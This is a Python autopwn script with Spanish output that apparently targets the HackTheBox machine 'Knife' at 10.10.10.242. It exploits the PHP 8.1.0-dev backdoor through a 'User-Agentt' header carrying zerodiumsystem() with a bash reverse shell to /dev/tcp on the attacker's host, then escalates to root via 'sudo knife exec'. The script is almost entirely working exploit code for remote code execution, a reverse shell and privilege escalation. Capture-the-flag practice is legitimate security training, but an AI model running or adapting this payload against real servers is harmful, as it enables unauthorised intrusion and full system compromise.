#!/usr/bin/python3

#============= imports ===============
from pwn import * # pip3 install pwn
import requests
#=====================================

def banner():

    print(" _  ___   _ ___ _____ _____                  _        ______        ___   _ ") 
    print("| |  / \ | |_ _|  ___| ____|      __ _ _   _| |_ ___ |  _ \ \      / / \ | |")
    print("| ' /|  \| || || |_  |  _| _____ / _` | | | | __/ _ \| |_) \ \ /\ / /|  \| |")
    print("| . \| |\  || ||  _| | |__|_____| (_| | |_| | || (_) |  __/ \ V  V / | |\  |")
    print("|_|\_\_| \_|___|_|   |_____|     \__,_|\__,_|\__\___/|_|     \_/\_/  |_| \_|")
    print("                                                                            ")
    print("                                                  by z3r0byte               ")

# ctrl + c

def def_handler(sig, frame):
    print("\n[!] Saliendo...)\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# variables

main_url="http://10.10.10.242/"

# explotación

def mainFunc(host, puerto):
    
    p1 = log.progress("Accediendo al sistema mediante un backdoor de PHP 8.1.0-dev")
    
    Headers = {
        'User-Agentt': 'zerodiumsystem("bash -c \' bash -i >& /dev/tcp/%s/%s 0>&1\'");' % (host.rstrip("\n"), puerto)
    }
    time.sleep(1)
    r = requests.get(main_url, headers=Headers)
    p1.success("Backdoor explotado correctamente")

if __name__ == '__main__':
    banner()    
    try:
        lport="4444"
        lhost=input("\nIntroduce tu LHOST para la reverse shell: ")
        threading.Thread(target=mainFunc, args=(lhost, lport)).start()

    except Exception as e:
        log.error(str(e))

    p2 = log.progress("Obteniendo reverse shell")
    shell = listen(lport, timeout=10).wait_for_connection()
    
    if shell.sock is None:
        p2.failure("No ha sido posible comprometer el sistema")
        sys.exit(1)
    else:
        p2.success("Reverse shell obtenida")
        shell.sendline(b'sudo knife exec -E \'exec "/bin/sh"\'')
        shell.interactive()
